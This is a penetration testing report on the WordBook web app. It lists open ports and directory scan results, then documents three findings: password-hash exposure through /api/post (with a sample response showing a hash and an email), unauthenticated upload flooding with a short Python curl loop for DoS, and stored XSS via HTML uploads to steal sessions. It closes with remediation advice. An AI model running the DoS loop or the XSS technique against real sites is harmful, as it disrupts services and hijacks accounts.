## Penetration testing report for WordBook

### 2024-01-31 1p22geo <1p22geodecki@gmail.com>

#### Scope: WordBook application, revision ea4c7c59e7d93ad57d554c7de7a66c2bfa7920c3, branch main, testing/development environment, "minisforum" server

## Testing environment
Penetration testing was conducted on the entire testing/development environment, the server with all running containers and jobs.  
Every single open port and file on the server is in scope, since it might be a vulnerability. 
Of course, the scope also includes the actual application, running in a staging/pre-production configuration - in Docker compose, with all containers, including telemetry, database and app containers.

## Discovered vulnerabilities
- hash exposure (vuln #01)
    - the vulnerability is not fully patched, the /api/post?user=x endpoint variant is still vulnerable and exposes unsalted password hashes together with user information.
    - AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
- unlimited file uploads (vuln #03)
    - an adversary can make the app container run out of storage space, and if sufficient measures (such as disk quota or administrator actions) are not taken, no data may be saved on the entire host machine.
    - AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:N/A:H
- stored XSS (vuln #04)
    - HTML uploads and links attachments can be used to steal session IDs (especially since they last for 10 days now), or execute other malicious JavaScript code.
    - Any exploitation does require the user to click a link to a attached HTML page.
    - AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:N
    

## Attack surface
### Nmap scan result
[download here](./nmap.txt)
As you can see, the Nmap scan revealed a couple open ports:
- port 22 - main SSH server, accepting only public key logins.
- ports 2376, 2377 - docker:dind container for Jenkins and automated Docker builds.
- port 3000 - main WordBook app server, only port needed to forward outwards
- port 4000 - Gitea server, hosting the source code for all projects
- port 4022 - Git/SSH server for git push'ing to Gitea
- port 7860 - Stable Diffusion WebUI, completely irrelevant app, no auth methods, so may be vulnerable
- port 7946 - OpenTelemetry something, propably no need for it to be public
- port 8080 - Jenkins instance, password/login protected
- port 9411 - Zipkin instance for telemetry viewing
- port 16686 - Jaeger UI, more advanced telemetry interface
- ports 32813-32820 - OpenTelemetry endpoints and extensions
    - port 32816 - some JSON-based REST API
- port 50000 - unused OTel Prometheus extension

### Directory scanning result (dirb)
```
+ http://192.168.50.193:3000/cgi-bin/ (CODE:308|SIZE:8)
+ http://192.168.50.193:3000/favicon.ico (CODE:200|SIZE:11694)
+ http://192.168.50.193:3000/in (CODE:307|SIZE:4224)
+ http://192.168.50.193:3000/login (CODE:200|SIZE:6096)
+ http://192.168.50.193:3000/signup (CODE:200|SIZE:6831)
+ http://192.168.50.193:3000/in/cgi-bin/ (CODE:308|SIZE:11)
+ http://192.168.50.193:3000/in/user (CODE:307|SIZE:4951)
+ http://192.168.50.193:3000/api/cgi-bin/ (CODE:308|SIZE:12)
+ http://192.168.50.193:3000/api/check (CODE:405|SIZE:0)
+ http://192.168.50.193:3000/api/comment (CODE:405|SIZE:0)
+ http://192.168.50.193:3000/api/login (CODE:405|SIZE:0)
+ http://192.168.50.193:3000/api/logout (CODE:307|SIZE:0)
+ http://192.168.50.193:3000/api/post (CODE:401|SIZE:31)
+ http://192.168.50.193:3000/api/register (CODE:405|SIZE:0)
+ http://192.168.50.193:3000/api/upload (CODE:405|SIZE:0)
+ http://192.168.50.193:3000/api/user (CODE:405|SIZE:0)
```
Even though the cgi-bin results are false positives, the scan revealed some interesting API endpoints, which were not usually accessed by front-end JS code.

# Vulnerability report

## Hash exposure
The hash exposure vulnerability is *not fully patched*, the /api/post endpoint, when asked for posts of a specific user will give out their password hash too.

GET /api/post?user=65ba0faa143573f7cd06a5bf&page=0

```json
{
    "posts":[
        {
            "_id":"65ba3153143573f7cd06a5c6",
            "content":"aaaaa",
            "posted":1706701139786,
            "comments":[],
            "up":0,
            "down":0,
            "author":{
                "_id":"65ba0faa143573f7cd06a5bf",
                "email":"1p22geo@gmail.com",
                "name":"bartsz",
                "hash":"489cd5dbc708c7e541de4d7cd91ce6d0f1613573b7fc5b40d3942ccb9555cf35",
                "added":1706692522914,
                "type":"user"
            }
        }
    ]
}
```
Affected components: 
- /api/post endpoint

## Unlimited form uploads
File uploads are still not rate limited or tracked in any way.
```python
import os
host = os.sys.argv[1]
while True:
    os.system(f"curl -b session=x -X POST -F \"file=@./file\"  {host}/api/upload")
```
A simple Python script can be used to DoS the server, uploading a single file repeatedly. 
Somehow file uploads don't even require authorization, and since the app is in a container, disk space runs out pretty quickly.

## Stored XSS
(this one will require user interaction)
You can upload an HTML file in the image upload form, and the markdown editor will try to append it as an image, like so
```markdown
![file.html](file.html)
```
But by removing the initial ! an adversary might make this a clickable link. Someone who clicks on the link, will get redirected to the HTML webpage created by the adversary, hosted in the WordBook domain, accessed through the /api/image endpoint, so CORS protection and others will not take place. The HTML webpage might now contain `<script>` tags, and all malicious code will be executed.
This script will be able to access `document.cookie`, as the session cookie is not HTTP-only.

It gets worse than that. The Next.js bundle for the inital /in request contains the session string. The bundle is minified and optimized, but it can be recovered. This file is a proof of concept.
[file.html](./file.html)
It recovers the session string, without using document.cookie. Even if the session cookie becomes HTTP-only, this one will still work.

# Remediation

## Hash exposure
This vulnerability is genuninely patched in all components, there is just a single vulnerable API endpoint left, propably all there is to do is apply that mongoDB aggregation stage to that one query too.

## Unlimited form uploads
Make a database collection `uploads`, start authenticating file uploads, measure the file size, and check who is uploading the most files. This will require moderator and administrator activity, but any automated solutions for this case will end up banning people who did nothing wrong.

## Stored XSS
This is propably the trickiest vulnerability to mitigate, since it's not about the app being vulerable, but the possibility of injecting a vulnerable component.
Banning all uploads except images would be one way to do it, but disallowing all non-image file attachments is quite a price to pay.
We could make all links `target=_blank download=true` links, and add `Content-Disposition: Attachment` headers to all /api/image requests, to make files only downloadable unless they are images.
Or we could change the content-type of all uploaded files (except images) into `application/octet-stream` to make sure browsers don't try to open them as HTML and show the "what to do with this file" dialog.


---
### Report attachments:
- attachment 01 : nmap scan result
[./nmap.txt](./nmap.txt)
- attachment 02: Python script for file upload DoS
[./script.py](./script.py)
- attachment 03 : HTML file as XSS PoC (actually this link is an example of exploitation)
[./file.html](./file.html)
